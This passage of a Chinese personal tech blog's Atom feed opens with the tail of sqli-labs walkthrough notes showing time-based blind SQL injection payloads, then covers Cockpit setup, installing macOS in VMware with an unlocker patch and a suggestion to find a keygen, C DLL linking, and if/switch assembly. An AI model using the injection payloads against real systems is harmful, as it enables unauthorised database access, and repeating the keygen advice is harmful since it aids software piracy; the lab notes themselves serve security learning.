class="number">1</span>&quot; AND SLEEP(2) --+</span><br></pre></td></tr></table></figure><p>成功延时，可推测查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span>&quot;id&quot;</span><br></pre></td></tr></table></figure><p>进行闭合后插入注入验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span><br></pre></td></tr></table></figure><p>验证成功，扔sqlmap</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Sqli-lab-过关笔记-Less-1-Less-10&quot;&gt;&lt;a href=&quot;#Sqli-lab-过关笔记-Less-1-Less-10&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 过关笔记 Less 1-Less 10&quot;&gt;&lt;/a&gt;Sqli-lab 过关笔记 Less 1-Less 10&lt;/h1&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="sqli-lab" scheme="http://0w0.host/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>Cockpit For RHEL8</title>
    <link href="http://0w0.host/2020/03/05/Cockpit-For-RHEL8/"/>
    <id>http://0w0.host/2020/03/05/Cockpit-For-RHEL8/</id>
    <published>2020-03-05T02:10:19.000Z</published>
    <updated>2020-03-05T06:06:25.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote><p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p></blockquote><a id="more"></a><p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p><p>如果是RHEL7的话则需要添加Extras软件库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure><hr><h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install cockpit -y &#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket &#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent &#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure><hr><h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p><p>且使用系统用户帐户和密码登录。</p><p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p><p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p><p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://cockpit-project.org/&quot;&gt;Cockpit&lt;/a&gt; : The &lt;a href=&quot;https://cockpit-project.org/#easy-to-use&quot;&gt;easy-to-use&lt;/a&gt;, &lt;a href=&quot;https://cockpit-project.org/#integrated&quot;&gt;integrated&lt;/a&gt;, &lt;a href=&quot;https://cockpit-project.org/#glanceable&quot;&gt;glanceable&lt;/a&gt;, and &lt;a href=&quot;https://cockpit-project.org/#open-ended&quot;&gt;open&lt;/a&gt; web-based interface for your servers .&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Linux" scheme="http://0w0.host/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>在VMware Player 15中安装MacOS</title>
    <link href="http://0w0.host/2020/03/02/%E5%9C%A8VMware-Player-15%E4%B8%AD%E5%AE%89%E8%A3%85MacOS/"/>
    <id>http://0w0.host/2020/03/02/%E5%9C%A8VMware-Player-15%E4%B8%AD%E5%AE%89%E8%A3%85MacOS/</id>
    <published>2020-03-02T07:39:46.000Z</published>
    <updated>2021-01-22T09:15:10.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-安装前准备"><a href="#0x0-安装前准备" class="headerlink" title="0x0 安装前准备"></a>0x0 安装前准备</h1><blockquote><p>材料准备：</p></blockquote><blockquote><ol><li><p>镜像文件：这里我使用的是 OS X 10.13</p></li><li><p>VMware 的 MacOS的破解补丁</p></li><li><p>VMware Workstation 15 软件，注册码或注册机自己百度，嫌麻烦就使用VirtualBox</p></li></ol></blockquote><a id="more"></a><p>文件链接 :  <a href="https://pan.baidu.com/s/1YqU5nhO764ANK_x4bgvJaA">密码:2333</a>    <a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">VMware Download</a> </p><h1 id="0x1-安装"><a href="#0x1-安装" class="headerlink" title="0x1 安装"></a>0x1 安装</h1><p>下载破解补丁后解压出来以管理员模式运行 <em>win-install.cmd</em>  </p><p><img src="https://i.loli.net/2020/03/02/MOaZzCDIqcUn2xw.png" alt="unlocker.png"></p><p>运行结束后就开始使用VMware Workstation 15 Player部署呗</p><p><img src="https://i.loli.net/2020/03/02/JBA96jwbYCuaQP1.png" alt="1.png"></p><p><img src="https://i.loli.net/2020/03/02/U3NWGHA7lzxT4Kw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/03/02/jdQMYgVZt1q357f.png" alt="3.png"></p><p>之后便是一路Next，最后Fish</p><hr><p>启动虚拟机后可能会出现以下问题</p><p><img src="https://i.loli.net/2020/03/02/fXqvI9SE5YRT3WA.png" alt="4.png"></p><p>这是因为要检查很多东西，百度一下发现如下解决方法：</p><blockquote><ol><li>在虚拟机的路径中找到 <code>.vmx</code> 的文件</li><li>打开文件找到一行类似 <code>guestOS = &quot;darwin17-64&quot;</code></li><li>下一行追加 <code>cpuid.1.eax = &quot;0000:0000:0000:0001:0000:0110:1010:0101&quot;</code></li></ol></blockquote><p>保存再启动就可以解决，大概原理是虚拟机会对对核心进行检验，用mask来欺骗，从而过CPU不必要的检查</p><p>(#其实我也不知道，手动滑稽)</p><h1 id="0x2-系统安装"><a href="#0x2-系统安装" class="headerlink" title="0x2 系统安装"></a>0x2 系统安装</h1><p>进入界面后第一件事，调出终端建议进行以下步骤方便后续安装VMware Tools ：<a href="#0x4-VMware-Tools%E5%AE%89%E8%A3%85">VMware Tools安装</a></p><p>再进行进行磁盘管理</p><p><img src="https://i.loli.net/2020/03/02/tz6FoAHBXE2hwQc.png" alt="5.png"></p><p><img src="https://i.loli.net/2020/03/02/wgE1uv3GJy6AFcD.png" alt="6.png"></p><p>作为系统盘呗，需要自己再自行添加硬盘</p><p><img src="https://i.loli.net/2020/03/02/DrBsNQeHL1ipIlj.png" alt="7.png"></p><p>之后就是等它静默安装，然后再进行常规的系统配置</p><p><img src="https://i.loli.net/2020/03/02/r8wZbAIHmqoQEeu.png" alt="9.png"></p><p>安装好VMware Tools后就开始享用OS X吧</p><h1 id="0x3-添加硬盘及网络配置"><a href="#0x3-添加硬盘及网络配置" class="headerlink" title="0x3 添加硬盘及网络配置"></a>0x3 添加硬盘及网络配置</h1><p><img src="https://i.loli.net/2020/03/02/uzWvTp3qRwmAUOD.png" alt="10.png"></p><p>设置网络 设置 - &gt; 网络 - &gt; WLAN - &gt; 更改适配器设置</p><p><img src="https://i.loli.net/2020/03/02/QeGR8d5CFU3whp1.png" alt="11.png"></p><p><img src="https://i.loli.net/2020/03/02/Voeaxsi57QCBF8N.png" alt="12.png"></p><p><img src="https://i.loli.net/2020/03/02/wWmnTudCaGfqscD.png" alt="12.png"></p><p><img src="https://i.loli.net/2020/03/02/U4fxJuE8lvwtVO1.png" alt="12.png"></p><p>然后进Mac看设置</p><p><img src="https://i.loli.net/2020/03/02/cFeDdaQlm8326WZ.png" alt="13.png"></p><p>显示绿点则说明连接成功</p><h1 id="0x4-VMware-Tools安装"><a href="#0x4-VMware-Tools安装" class="headerlink" title="0x4 VMware Tools安装"></a>0x4 VMware Tools安装</h1><p>反复装不上VMware Tools 通过百度发现Mac有SIP系统完整性保护机制</p><p>我们就进入Recovery里手动关闭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># csrutil status &#x2F;&#x2F;检查状态 enable 为开启</span><br><span class="line"># csrutil disable &#x2F;&#x2F;关闭保护机制</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/P6o8CTOLGdAfkIQ.png" alt="16.png"></p><p><img src="https://i.loli.net/2020/03/03/or9MFBzdan1KvGC.png" alt="17.png"></p><p>之后便可以开心的安装VMware Tools 了</p><p><img src="https://i.loli.net/2020/03/03/cKBhbYw6ROHlTvI.png" alt="18.png"></p><h1 id="0x5-安装Xcode"><a href="#0x5-安装Xcode" class="headerlink" title="0x5 安装Xcode"></a>0x5 安装Xcode</h1><p>就在商店自己安装呗，现在Xcode的最低支持版本是 OS X 10.14.4</p><p><img src="https://i.loli.net/2020/03/03/S6VIMvT7AEYxaLo.png" alt="19.png"></p><p>然后就可以 愉cao 快dan的 敲xiu 码bug 了</p><hr><p>[^]: 注：本文资料大多来源于网络，如果有侵权，请联系作者删除。2020/03/03 二次修改。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x0-安装前准备&quot;&gt;&lt;a href=&quot;#0x0-安装前准备&quot; class=&quot;headerlink&quot; title=&quot;0x0 安装前准备&quot;&gt;&lt;/a&gt;0x0 安装前准备&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;材料准备：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;镜像文件：这里我使用的是 OS X 10.13&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;VMware 的 MacOS的破解补丁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;VMware Workstation 15 软件，注册码或注册机自己百度，嫌麻烦就使用VirtualBox&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="黑苹果" scheme="http://0w0.host/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>简单使用链接库</title>
    <link href="http://0w0.host/2020/01/20/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
    <id>http://0w0.host/2020/01/20/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E9%93%BE%E6%8E%A5%E5%BA%93/</id>
    <published>2020-01-20T15:19:11.000Z</published>
    <updated>2020-01-22T04:56:48.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用静态链接库"><a href="#使用静态链接库" class="headerlink" title="使用静态链接库"></a>使用静态链接库</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TestLib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestLib.lib&quot;</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在项目 <span class="built_in">set</span> &gt; link 里添加相应lib文件，需申明头文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>静态链接库:把代码静态编译到exe中，更改lib内容就得重新编译使用</p></blockquote><hr><h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><h2 id="链接库头文件写法"><a href="#链接库头文件写法" class="headerlink" title="链接库头文件写法"></a>链接库头文件写法</h2><h3 id="使用-declspec-dllexport"><a href="#使用-declspec-dllexport" class="headerlink" title="使用_declspec(dllexport)"></a>使用<code>_declspec(dllexport)</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="comment">//extern 申明为全局</span></span><br><span class="line"><span class="comment">//&quot;C&quot; 申明以C的语法处理，避免编译器无法判断处理方式把函数魔性改名</span></span><br><span class="line"><span class="comment">//_declspec(dllexport) 申明函数将导出</span></span><br></pre></td></tr></table></figure><h3 id="使用-def"><a href="#使用-def" class="headerlink" title="使用.def"></a>使用<code>.def</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FuncList.def</span></span><br><span class="line">EXPORT</span><br><span class="line"></span><br><span class="line">Func @<span class="number">12</span> (NONAME)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="引用写法"><a href="#引用写法" class="headerlink" title="引用写法"></a>引用写法</h2><h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestDLL.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="显式链接"><a href="#显式链接" class="headerlink" title="显式链接"></a>显式链接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lpFunc)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>; <span class="comment">//申明函数指针</span></span><br><span class="line"></span><br><span class="line">lpFunc myFun; <span class="comment">//创建指针</span></span><br><span class="line"></span><br><span class="line">HINSTANCE hModule = LoadLibrary(<span class="string">&quot;TestDLL.dll&quot;</span>); <span class="comment">//载入dll</span></span><br><span class="line"></span><br><span class="line">myFun = (lpFunc)GetProcAddress(hModule, <span class="string">&quot;Func&quot;</span>); <span class="comment">//把指针指向dll内函数的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;使用静态链接库&quot;&gt;&lt;a href=&quot;#使用静态链接库&quot; class=&quot;headerlink&quot; title=&quot;使用静态链接库&quot;&gt;&lt;/a&gt;使用静态链接库&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;quot;TestLib.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;pragma&lt;/span&gt; comment(lib, &lt;span class=&quot;meta-string&quot;&gt;&amp;quot;TestLib.lib&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="C" scheme="http://0w0.host/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>浅谈if/switch的&quot;效率革命&quot;</title>
    <link href="http://0w0.host/2019/12/06/%E6%B5%85%E8%B0%88switch-if/"/>
    <id>http://0w0.host/2019/12/06/%E6%B5%85%E8%B0%88switch-if/</id>
    <published>2019-12-05T16:21:21.000Z</published>
    <updated>2020-03-03T07:19:55.127Z</updated>
    
    <content type="html"><![CDATA[<p>效率似乎是个或远或近的词，对于许多人来说，在如此快速的今天，似乎不太重视那肉眼不可分的损耗。每个人都有自己的”傲慢与偏见”，而就在这里让我们回过头来看一看某些被我们忽略的一些小细节。</p><p>流程对于我们日常生活来说并不陌生，或许一条道走到黑的日子并不是丰富多彩。这时条件分支便给我们提供了更加灵活的可能。</p><a id="more"></a><p>便会有类似于这种的if语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或许c代码许多人已经烂熟于心了，那就看看汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">0040102F   mov         eax,1</span><br><span class="line">00401034   test        eax,eax</span><br><span class="line">00401036   je          main+2Fh (0040103f)</span><br><span class="line">00401038   mov         dword ptr [ebp-4],1</span><br></pre></td></tr></table></figure><p>可以发现if的实现就是对于表达式值的一个比较，当不满足后便用jmp直接跳转</p><p>再来看看if-else语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c部分就不再多解释，直接跳到汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">&#x2F;&#x2F;a变量的值扔进eax</span><br><span class="line"></span><br><span class="line">0040102F   cmp         dword ptr [ebp-4],1</span><br><span class="line">00401033   jne         main+2Eh (0040103e)</span><br><span class="line">&#x2F;&#x2F;与1比较，如果不等于1就跳到else语句处</span><br><span class="line">00401035   mov         dword ptr [ebp-4],1 &#x2F;&#x2F;if语句内的功能语句</span><br><span class="line">0040103C   jmp         main+35h (00401045)</span><br><span class="line">&#x2F;&#x2F;跳出if语句</span><br><span class="line"></span><br><span class="line">0040103E   mov         dword ptr [ebp-4],2&#x2F;&#x2F;else语句内的功能语句</span><br></pre></td></tr></table></figure><p>对于if-else来说依旧是使用判断跳转的方式去处理条件分支，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21</span>:       DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span></span><br><span class="line"><span class="number">22</span>:</span><br><span class="line"><span class="number">23</span>:       <span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line"><span class="number">0040102F</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">00401033</span>   jne         main+<span class="number">53</span>h (<span class="number">00401063</span>)</span><br><span class="line"><span class="number">24</span>:       &#123;</span><br><span class="line"><span class="number">25</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401035</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">26</span>:           <span class="keyword">if</span>( a == <span class="number">2</span>)</span><br><span class="line"><span class="number">0040103</span>C   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401040</span>   jne         main+<span class="number">3B</span>h (<span class="number">0040104b</span>)</span><br><span class="line"><span class="number">27</span>:           &#123;</span><br><span class="line"><span class="number">28</span>:               a = <span class="number">2</span>;</span><br><span class="line"><span class="number">00401042</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">29</span>:           &#125;</span><br><span class="line"><span class="number">30</span>:           <span class="keyword">else</span> <span class="keyword">if</span>(a == <span class="number">4</span>)</span><br><span class="line"><span class="number">00401049</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">0040104B</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">0040104F</span>   jne         main+<span class="number">4</span>Ah (<span class="number">0040105</span>a)</span><br><span class="line"><span class="number">31</span>:           &#123;</span><br><span class="line"><span class="number">32</span>:               a = <span class="number">4</span>;</span><br><span class="line"><span class="number">00401051</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">33</span>:           &#125;</span><br><span class="line"><span class="number">34</span>:           <span class="keyword">else</span></span><br><span class="line"><span class="number">00401058</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">35</span>:           &#123;</span><br><span class="line"><span class="number">36</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040105</span>A   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">37</span>:           &#125;</span><br><span class="line"><span class="number">38</span>:       &#125;</span><br><span class="line"><span class="number">39</span>:       <span class="keyword">else</span></span><br><span class="line"><span class="number">00401061</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">40</span>:       &#123;</span><br><span class="line"><span class="number">41</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401063</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">42</span>:           <span class="keyword">if</span> (a/<span class="number">10</span><span class="number">-2</span>+<span class="number">7</span>)</span><br><span class="line"><span class="number">0040106</span>A   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0040106</span>D   cdq</span><br><span class="line"><span class="number">0040106</span>E   mov         ecx,<span class="number">0</span>Ah</span><br><span class="line"><span class="number">00401073</span>   idiv        eax,ecx</span><br><span class="line"><span class="number">00401075</span>   add         eax,<span class="number">5</span></span><br><span class="line"><span class="number">00401078</span>   test        eax,eax</span><br><span class="line"><span class="number">0040107</span>A   je          main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">43</span>:           &#123;</span><br><span class="line"><span class="number">44</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040107</span>C   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">45</span>:           &#125;</span><br><span class="line"><span class="number">46</span>:       &#125;</span><br></pre></td></tr></table></figure><h2 id="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"><a href="#同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句" class="headerlink" title="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"></a>同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span 